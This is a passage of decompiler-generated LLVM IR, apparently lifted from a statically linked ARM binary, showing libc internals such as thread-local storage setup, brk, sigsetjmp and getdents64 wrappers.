  %v5_17394 = add i32 %v4_17394, %v2_1732c
  store i32 %v5_17394, i32* %r3.global-to-local, align 4
  %v3_17398 = icmp ult i32 %v1_1738c, %v5_17394
  br i1 %v3_17398, label %dec_label_pc_17354, label %dec_label_pc_17390.dec_label_pc_17504.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17360
  %v2_173ac = add i32 %v3_17364, -1
  br label %dec_label_pc_173d4

dec_label_pc_173d0:                               ; preds = %dec_label_pc_17360, %dec_label_pc_17504
  %v0_173e4.pre = phi i32 [ %v0_173e4.pre.pre, %dec_label_pc_17504 ], [ ptrtoint (i32* @global_var_21694.308 to i32), %dec_label_pc_17360 ]
  %v1_173d4.pre = phi i32 [ %v1_173d4.pre.pre, %dec_label_pc_17504 ], [ %v0_17338, %dec_label_pc_17360 ]
  %v1_173f825 = phi i32 [ %v0_1750c, %dec_label_pc_17504 ], [ %v0_1733c.v3_17364, %dec_label_pc_17360 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17504 ], [ %v3_17360, %dec_label_pc_17360 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17504 ], [ %v3_1736c, %dec_label_pc_17360 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17504 ], [ %v3_17370, %dec_label_pc_17360 ]
  br label %dec_label_pc_173d4

dec_label_pc_173d4:                               ; preds = %bb, %dec_label_pc_173d0
  %storemerge80 = phi i32 [ %v2_173ac, %bb ], [ 0, %dec_label_pc_173d0 ]
  %v0_173d4 = phi i32 [ %v2_173ac, %bb ], [ 0, %dec_label_pc_173d0 ]
  %storemerge = phi i32 [ %v3_17364, %bb ], [ 1, %dec_label_pc_173d0 ]
  %storemerge79 = phi i32 [ %v3_17364, %bb ], [ 1, %dec_label_pc_173d0 ]
  %v0_173e4 = phi i32 [ ptrtoint (i32* @global_var_21694.308 to i32), %bb ], [ %v0_173e4.pre, %dec_label_pc_173d0 ]
  %v1_173d4 = phi i32 [ %v0_17338, %bb ], [ %v1_173d4.pre, %dec_label_pc_173d0 ]
  %v1_173f8 = phi i32 [ %v0_1733c.v3_17364, %bb ], [ %v1_173f825, %dec_label_pc_173d0 ]
  %stack_var_-52.3 = phi i32 [ %v3_17360, %bb ], [ %stack_var_-52.0, %dec_label_pc_173d0 ]
  %stack_var_-48.3 = phi i32 [ %v3_1736c, %bb ], [ %stack_var_-48.0, %dec_label_pc_173d0 ]
  %stack_var_-44.3 = phi i32 [ %v3_17370, %bb ], [ %stack_var_-44.0, %dec_label_pc_173d0 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_173d4 = add i32 %v1_173d4, %v0_173d4
  %v2_173d8 = udiv i32 %v2_173d4, %storemerge
  store i32 %v2_173d8, i32* %r0.global-to-local, align 4
  %v2_173dc = mul i32 %v2_173d8, %storemerge
  store i32 %v2_173dc, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_173e4 = add i32 %v0_173e4, 72
  %v3_173e4 = inttoptr i32 %v2_173e4 to i32*
  %v4_173e4 = load i32, i32* %v3_173e4, align 4
  store i32 %v4_173e4, i32* %r3.global-to-local, align 4
  %v1_173e8 = inttoptr i32 %v4_173e4 to i32*
  %v2_173e8 = load i32, i32* %v1_173e8, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_173f0 = add i32 %v1_173f8, 1168
  %v2_173f4 = add i32 %v1_173f0, %stack_var_-52.3
  %v2_173f8 = add i32 %v2_173f4, %v2_173dc
  %v2_173fc = add i32 %v2_173f8, %v2_173e8
  store i32 %v2_173fc, i32* %r0.global-to-local, align 4
  %v1_17400 = call i32 @__GI_sbrk(i32 %v2_173fc)
  %v1_17404 = load i32, i32* %fp.global-to-local, align 4
  %v1_1740c = sub i32 0, %v1_17404
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17404 = add i32 %v1_17400, 1167
  %v1_17414 = add i32 %v2_17404, %v1_17404
  %v2_17418 = and i32 %v1_17414, %v1_1740c
  store i32 %v2_17418, i32* @r5, align 4
  %v1_17420 = load i32, i32* %sl.global-to-local, align 4
  %v3_17420 = add i32 %v1_17420, 10236
  %v4_17420 = inttoptr i32 %v3_17420 to i32*
  store i32 62, i32* %v4_17420, align 4
  %v0_17428 = load i32, i32* @r5, align 4
  %v1_17428 = load i32, i32* %sb.global-to-local, align 4
  %v2_17428 = add i32 %v1_17428, %v0_17428
  store i32 %v2_17428, i32* @ip, align 4
  %v0_1742c = load i32, i32* %sl.global-to-local, align 4
  %v1_1742c = load i32, i32* %r4.global-to-local, align 4
  %v2_1742c = add i32 %v1_1742c, %v0_1742c
  store i32 %v2_1742c, i32* %r4.global-to-local, align 4
  %v2_17430 = add i32 %v0_1742c, 11524
  store i32 %v2_17430, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17428, i32* @r0, align 4
  %v2_17444 = add i32 %v2_1742c, 16
  %v3_17444 = inttoptr i32 %v2_17444 to i32*
  store i32 %v2_17428, i32* %v3_17444, align 4
  %v0_17448 = load i32, i32* %sb.global-to-local, align 4
  %v1_17448 = load i32, i32* %r8.global-to-local, align 4
  %v2_17448 = add i32 %v1_17448, 40
  %v3_17448 = inttoptr i32 %v2_17448 to i32*
  store i32 %v0_17448, i32* %v3_17448, align 4
  %v0_1744c = load i32, i32* @r3, align 4
  %v1_1744c = trunc i32 %v0_1744c to i8
  %v2_1744c = load i32, i32* %r4.global-to-local, align 4
  %v3_1744c = add i32 %v2_1744c, 20
  %v4_1744c = inttoptr i32 %v3_1744c to i8*
  store i8 %v1_1744c, i8* %v4_1744c, align 1
  %v0_17450 = load i32, i32* %r4.global-to-local, align 4
  %v1_17450 = add i32 %v0_17450, 8
  store i32 %v1_17450, i32* @r4, align 4
  %v0_17454 = call i32 @memcpy()
  %v0_1745c = load i32, i32* @r4, align 4
  %v1_1745c = load i32, i32* @r5, align 4
  %v2_1745c = inttoptr i32 %v1_1745c to i32*
  store i32 %v0_1745c, i32* %v2_1745c, align 4
  %v0_17460 = load i32, i32* @r5, align 4
  store i32 %v0_17460, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17460, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_12d50.501 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17474 = load i32, i32* %sl.global-to-local, align 4
  %v2_17474 = add i32 %v0_17474, 84
  %v3_17474 = inttoptr i32 %v2_17474 to i32*
  %v4_17474 = load i32, i32* %v3_17474, align 4
  store i32 %v4_17474, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17480 = add i32 %v0_17474, 60
  %v3_17480 = inttoptr i32 %v2_17480 to i32*
  %v4_17480 = load i32, i32* %v3_17480, align 4
  store i32 %v4_17480, i32* %r0.global-to-local, align 4
  %v3_17488 = add i32 %v0_17474, 10748
  %v4_17488 = inttoptr i32 %v3_17488 to i32*
  store i32 64, i32* %v4_17488, align 4
  %v1_17490 = load i32, i32* %r8.global-to-local, align 4
  %v2_17490 = add i32 %v1_17490, 20
  %v3_17490 = inttoptr i32 %v2_17490 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17490, align 4
  %v1_17498 = load i32, i32* %r8.global-to-local, align 4
  %v2_17498 = add i32 %v1_17498, 24
  %v3_17498 = inttoptr i32 %v2_17498 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17498, align 4
  %v1_174a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_174a0 = inttoptr i32 %v1_174a0 to i32*
  store i32 1, i32* %v2_174a0, align 4
  %v1_174a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_174a8 = add i32 %v1_174a8, 28
  %v3_174a8 = inttoptr i32 %v2_174a8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_174a8, align 4
  %v0_174b0 = load i32, i32* @r6, align 4
  %v2_174b0 = icmp eq i32 %v0_174b0, 0
  %v1_174b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_174b4 = add i32 %v1_174b4, 44
  %v3_174b4 = inttoptr i32 %v2_174b4 to i32*
  store i32 1, i32* %v3_174b4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_174bc = load i32, i32* %sl.global-to-local, align 4
  %v1_174bc = load i32, i32* %r1.global-to-local, align 4
  %v2_174bc = add i32 %v1_174bc, %v0_174bc
  store i32 %v2_174bc, i32* %r2.global-to-local, align 4
  %v1_174c0 = load i32, i32* @r6, align 4
  br i1 %v2_174b0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_173d4
  store i32 %v1_174c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_174cc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_174cc35 = add i32 %v1_174cc34, 32
  %v3_174cc36 = inttoptr i32 %v2_174cc35 to i32*
  store i32 %v1_174c0, i32* %v3_174cc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_173d4
  %v2_174c4 = add i32 %v1_174c0, -1
  store i32 %v2_174c4, i32* %r0.global-to-local, align 4
  %v1_174cc = load i32, i32* %r8.global-to-local, align 4
  %v2_174cc = add i32 %v1_174cc, 32
  %v3_174cc = inttoptr i32 %v2_174cc to i32*
  store i32 %v1_174c0, i32* %v3_174cc, align 4
  %v1_174d0 = load i32, i32* @r6, align 4
  store i32 %v1_174d0, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_174d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_174d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_174d4 = add i32 %v1_174d4, 28
  %v3_174d4 = inttoptr i32 %v2_174d4 to i32*
  store i32 %v0_174d4, i32* %v3_174d4, align 4
  %v0_174d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_174d8 = inttoptr i32 %v1_174d8 to i32*
  store i32 %v0_174d8, i32* %v2_174d8, align 4
  %v0_174dc = load i32, i32* %r0.global-to-local, align 4
  %v1_174dc = load i32, i32* %r3.global-to-local, align 4
  %v2_174dc = add i32 %v1_174dc, %v0_174dc
  store i32 %v2_174dc, i32* %r0.global-to-local, align 4
  %v1_174e0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_174b0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_174e8.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_174e8 = phi i32 [ %v0_174e8.pre, %._crit_edge ], [ %v1_174e0, %bb54 ]
  %v2_174e4 = udiv i32 %v2_174dc, %v1_174e0
  %v2_174e8 = load i32, i32* %sb.global-to-local, align 4
  %v3_174e8 = mul i32 %v2_174e4, %v0_174e8
  %v4_174e8 = add i32 %v2_174e8, %v3_174e8
  store i32 %v4_174e8, i32* @r0, align 4
  %v0_174ec = load i32, i32* %fp.global-to-local, align 4
  %v2_174ec = icmp ult i32 %v0_174ec, 16
  %v0_174ec. = select i1 %v2_174ec, i32 16, i32 %v0_174ec
  store i32 %v0_174ec., i32* @r1, align 4
  %v2_174fc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_174fc, i32* @r4, align 4
  store i32 %v6_17318, i32* @r5, align 4
  store i32 %v15_17318, i32* %r8.global-to-local, align 4
  store i32 %v18_17318, i32* %sb.global-to-local, align 4
  store i32 %v21_17318, i32* %sl.global-to-local, align 4
  store i32 %v24_17318, i32* %fp.global-to-local, align 4
  store i32 %v27_17318, i32* @lr, align 4
  %v0_17500 = call i32 @init_static_tls()
  store i32 %v0_17500, i32* %r0.global-to-local, align 4
  %v0_1750c.pre = load i32, i32* @ip, align 4
  %v1_173d4.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_173e4.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17504

dec_label_pc_17390.dec_label_pc_17504.loopexit_crit_edge: ; preds = %dec_label_pc_1738c
  br label %dec_label_pc_17504.loopexit

dec_label_pc_17504.loopexit:                      ; preds = %dec_label_pc_17390.dec_label_pc_17504.loopexit_crit_edge, %dec_label_pc_17344
  br label %dec_label_pc_17504

dec_label_pc_17504:                               ; preds = %dec_label_pc_17504.loopexit, %entry, %bb55
  %v0_173e4.pre.pre = phi i32 [ ptrtoint (i32* @global_var_21694.308 to i32), %dec_label_pc_17504.loopexit ], [ ptrtoint (i32* @global_var_21694.308 to i32), %entry ], [ %v0_173e4.pre.pre.pre, %bb55 ]
  %v1_173d4.pre.pre = phi i32 [ %v0_17338, %dec_label_pc_17504.loopexit ], [ %v0_17338, %entry ], [ %v1_173d4.pre.pre.pre, %bb55 ]
  %v0_1750c = phi i32 [ %v0_1733c, %dec_label_pc_17504.loopexit ], [ %v0_1733c, %entry ], [ %v0_1750c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1750c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_173d0

; uselistorder directives
  uselistorder i32 %v0_1750c, { 1, 0 }
  uselistorder i32 %v1_174c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1742c, { 1, 0 }
  uselistorder i32 %v2_17428, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1738c, { 2, 1, 0 }
  uselistorder i32 %v3_17364, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1736c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17390, { 1, 0 }
  uselistorder i32 %v0_1733c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17338, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1732c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17504, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_173d4, { 1, 0 }
  uselistorder label %dec_label_pc_173d0, { 1, 0 }
  uselistorder label %dec_label_pc_17354, { 1, 0 }
}

define i32 @function_17524(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17524:
  %v0_17524 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17524, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_17524
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_17524
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_17550 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_17550
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v4_17560 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 156) to i32*), align 4
  %v4_17568 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 104) to i32*), align 4
  store i32 %v4_17568, i32* %r1.global-to-local, align 4
  %v1_1756c = add i32 %arg1, 44
  %v2_1756c = inttoptr i32 %v1_1756c to i32*
  %v3_1756c = load i32, i32* %v2_1756c, align 4
  %v1_17570 = add i32 %arg1, 28
  %v2_17570 = inttoptr i32 %v1_17570 to i32*
  %v3_17570 = load i32, i32* %v2_17570, align 4
  store i32 %v3_17570, i32* %r2.global-to-local, align 4
  %v2_17574 = inttoptr i32 %v4_17560 to i32*
  store i32 %v3_1756c, i32* %v2_17574, align 4
  %v0_17578 = load i32, i32* %r2.global-to-local, align 4
  %v1_17578 = load i32, i32* %r1.global-to-local, align 4
  %v2_17578 = inttoptr i32 %v1_17578 to i32*
  store i32 %v0_17578, i32* %v2_17578, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17584(i32 %arg1) local_unnamed_addr {
dec_label_pc_17584:
  %v0_17584 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17584, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17584
  %v1_17584 = load i32, i32* @ip, align 4
  %v3_17584 = mul i32 %v1_17584, %arg1
  %v2_17588 = load i32, i32* @r8, align 4
  %v4_17588 = and i32 %v2_17588, %v3_17584
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17584, %bb
  %v5_17588 = phi i32 [ %arg1, %dec_label_pc_17584 ], [ %v4_17588, %bb ]
  ret i32 %v5_17588

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17594 = add i32 %arg1, 40
  store i32 %v1_17594, i32* %r2.global-to-local, align 4
  %v1_17598 = inttoptr i32 %v1_17594 to i32*
  %v2_17598 = load i32, i32* %v1_17598, align 4
  store i32 %v2_17598, i32* %r2.global-to-local, align 4
  %v3_17598 = add i32 %arg1, 44
  %v4_17598 = inttoptr i32 %v3_17598 to i32*
  %v5_17598 = load i32, i32* %v4_17598, align 4
  store i32 %v5_17598, i32* %r3.global-to-local, align 4
  %v0_1759c = call i32 @__aeabi_read_tp()
  %v1_175a0 = inttoptr i32 %v0_1759c to i32*
  %v2_175a0 = load i32, i32* %v1_175a0, align 4
  store i32 %v2_175a0, i32* %r1.global-to-local, align 4
  %v3_175a4 = mul i32 %v5_17598, 8
  store i32 %v3_175a4, i32* %r3.global-to-local, align 4
  %v1_175a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_175a8 = add i32 %v1_175a8, %v0_1759c
  %v3_175ac = add i32 %v3_175a4, %v2_175a0
  %v4_175ac = inttoptr i32 %v3_175ac to i32*
  store i32 %v2_175a8, i32* %v4_175ac, align 4
  %v0_175b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_175b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_175b0 = add i32 %v1_175b0, %v0_175b0
  store i32 %v2_175b0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_175b8 = add i32 %v2_175b0, 4
  %v5_175b8 = inttoptr i32 %v4_175b8 to i8*
  store i8 1, i8* %v5_175b8, align 1
  %v0_175bc = load i32, i32* @r4, align 4
  %v1_175bc = add i32 %v0_175bc, 20
  store i32 %v1_175bc, i32* %r1.global-to-local, align 4
  %v1_175c0 = inttoptr i32 %v1_175bc to i32*
  %v2_175c0 = load i32, i32* %v1_175c0, align 4
  store i32 %v2_175c0, i32* @r1, align 4
  %v3_175c0 = add i32 %v0_175bc, 24
  %v4_175c0 = inttoptr i32 %v3_175c0 to i32*
  %v5_175c0 = load i32, i32* %v4_175c0, align 4
  store i32 %v5_175c0, i32* %r2.global-to-local, align 4
  %v5_175c4 = call i32 @__GI_mempcpy(i32 %v2_175a8, i32 %v2_175c0, i32 %v5_175c0, i32 1)
  %v0_175c8 = load i32, i32* @r4, align 4
  %v1_175c8 = add i32 %v0_175c8, 28
  store i32 %v1_175c8, i32* %r3.global-to-local, align 4
  %v1_175cc = inttoptr i32 %v1_175c8 to i32*
  %v2_175cc = load i32, i32* %v1_175cc, align 4
  store i32 %v2_175cc, i32* %r2.global-to-local, align 4
  %v3_175cc = add i32 %v0_175c8, 24
  %v4_175cc = inttoptr i32 %v3_175cc to i32*
  %v5_175cc = load i32, i32* %v4_175cc, align 4
  store i32 %v5_175cc, i32* %r3.global-to-local, align 4
  %v2_175d0 = sub i32 %v5_175cc, %v2_175cc
  store i32 %v2_175d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_175d8 = inttoptr i32 %v5_175c4 to i8*
  %v4_175d8 = call i32 @__GI_memset(i8* %v3_175d8, i32 0, i32 %v2_175d0)
  ret i32 %v4_175d8

; uselistorder directives
  uselistorder i32 %v3_175a4, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_17628:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_1763c = load i32, i32* @r0, align 4
  %v1_17640 = inttoptr i32 %v0_1763c to i32*
  %v2_17640 = load i32, i32* @r4, align 4
  store i32 %v2_17640, i32* %v1_17640, align 4
  %v3_17640 = add i32 %v0_1763c, 4
  %v4_17640 = inttoptr i32 %v3_17640 to i32*
  %v5_17640 = load i32, i32* @r5, align 4
  store i32 %v5_17640, i32* %v4_17640, align 4
  %v6_17640 = add i32 %v0_1763c, 8
  %v7_17640 = inttoptr i32 %v6_17640 to i32*
  %v8_17640 = load i32, i32* @r6, align 4
  store i32 %v8_17640, i32* %v7_17640, align 4
  %v9_17640 = add i32 %v0_1763c, 12
  %v10_17640 = inttoptr i32 %v9_17640 to i32*
  %v11_17640 = load i32, i32* @r7, align 4
  store i32 %v11_17640, i32* %v10_17640, align 4
  %v12_17640 = add i32 %v0_1763c, 16
  %v13_17640 = inttoptr i32 %v12_17640 to i32*
  %v14_17640 = load i32, i32* @r8, align 4
  store i32 %v14_17640, i32* %v13_17640, align 4
  %v15_17640 = add i32 %v0_1763c, 20
  %v16_17640 = inttoptr i32 %v15_17640 to i32*
  %v17_17640 = load i32, i32* @sb, align 4
  store i32 %v17_17640, i32* %v16_17640, align 4
  %v18_17640 = add i32 %v0_1763c, 24
  %v19_17640 = inttoptr i32 %v18_17640 to i32*
  %v20_17640 = load i32, i32* @sl, align 4
  store i32 %v20_17640, i32* %v19_17640, align 4
  %v21_17640 = add i32 %v0_1763c, 28
  %v22_17640 = inttoptr i32 %v21_17640 to i32*
  %v23_17640 = load i32, i32* @fp, align 4
  store i32 %v23_17640, i32* %v22_17640, align 4
  %v24_17640 = add i32 %v0_1763c, 32
  %v25_17640 = inttoptr i32 %v24_17640 to i32*
  %v27_17640 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_17640, i32* %v25_17640, align 4
  %v28_17640 = add i32 %v0_1763c, 36
  %v29_17640 = inttoptr i32 %v28_17640 to i32*
  %v30_17640 = load i32, i32* @lr, align 4
  store i32 %v30_17640, i32* %v29_17640, align 4
  %v0_17644 = call i32 @__sigjmp_save()
  ret i32 %v0_17644

; uselistorder directives
  uselistorder i32 %v0_1763c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 87, 88, 7, 8, 9, 10, 11, 12, 13, 14, 75, 76, 77, 78, 79, 81, 80, 82, 2, 15, 16, 17, 0, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26, 1, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 4, 5, 6, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 68, 66, 67, 69, 70, 73, 71, 72, 74, 83, 84, 85, 86 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_1764c = load i32, i32* @r5, align 4
  %v12_1764c = load i32, i32* @r7, align 4
  %v1_17650 = add i32 %arg3, 14
  %v2_17658 = ptrtoint i32* %stack_var_-72 to i32
  %v1_1765c = and i32 %v1_17650, -8
  %v2_17660 = sub i32 %v2_17658, %v1_1765c
  %v1_17664 = add i32 %v2_17660, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_176a8, label %dec_label_pc_1768c

dec_label_pc_1768c:                               ; preds = %entry
  %v1_17690 = sub i32 0, %arg1
  %v3_17694 = load i16, i16* @global_var_216ec.303, align 2
  %v4_17694 = sext i16 %v3_17694 to i32
  %v0_17698 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_176a0 = add i32 %v4_17694, %v0_17698
  %v4_176a0 = inttoptr i32 %v3_176a0 to i32*
  store i32 %v1_17690, i32* %v4_176a0, align 4
  br label %dec_label_pc_17778

dec_label_pc_176a8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17778, label %dec_label_pc_176b0

dec_label_pc_176b0:                               ; preds = %dec_label_pc_176a8
  %v2_176b0 = add i32 %v1_17664, %arg1
  store i32 %v2_176b0, i32* %r1.global-to-local, align 4
  %v2_176b4 = add i32 %tmp, %arg3
  store i32 %v1_17664, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17760

dec_label_pc_176d0:                               ; preds = %dec_label_pc_17760
  %v1_176d0 = add i32 %v0_17730, 16
  %v2_176d0 = inttoptr i32 %v1_176d0 to i16*
  %v3_176d0 = load i16, i16* %v2_176d0, align 2
  %v4_176d0 = zext i16 %v3_176d0 to i32
  %v1_176d4 = add nsw i32 %v4_176d0, -19
  store i32 %v1_176d4, i32* @r2, align 4
  %v1_176d8 = add nuw nsw i32 %v4_176d0, 7
  %v1_176dc = and i32 %v1_176d8, 131064
  store i32 %v1_176dc, i32* @ip, align 4
  %v2_176e4 = add i32 %v1_176dc, %v0_17738
  store i32 %v2_176e4, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_176e4, %v2_176b4
  br i1 %tmp24, label %dec_label_pc_176f0, label %dec_label_pc_1772c

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176d0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_176f8 = load i32, i32* %r8.global-to-local, align 4
  %v0_176fc = load i32, i32* %sb.global-to-local, align 4
  %v1_17700 = load i32, i32* @sp, align 4
  %v2_17700 = inttoptr i32 %v1_17700 to i32*
  store i32 0, i32* %v2_17700, align 4
  %v4_17704 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_176f8, i32 %v0_176fc)
  %v0_17708 = load i32, i32* @r5, align 4
  %v1_17708 = load i32, i32* %sl.global-to-local, align 4
  %v9_17708 = icmp eq i32 %v0_17708, %v1_17708
  br i1 %v9_17708, label %dec_label_pc_17710, label %dec_label_pc_17774

dec_label_pc_17710:                               ; preds = %dec_label_pc_176f0
  %v0_17714 = call i32 @__aeabi_read_tp()
  %v3_17718 = load i16, i16* @global_var_216ec.303, align 2
  %v4_17718 = sext i16 %v3_17718 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17724 = add i32 %v4_17718, %v0_17714
  %v4_17724 = inttoptr i32 %v3_17724 to i32*
  store i32 22, i32* %v4_17724, align 4
  br label %dec_label_pc_17778

dec_label_pc_1772c:                               ; preds = %dec_label_pc_176d0
  %v1_1772c = inttoptr i32 %v0_17730 to i32*
  %v2_1772c = load i32, i32* %v1_1772c, align 4
  %v3_1772c = add i32 %v0_17730, 4
  %v4_1772c = inttoptr i32 %v3_1772c to i32*
  %v5_1772c = load i32, i32* %v4_1772c, align 4
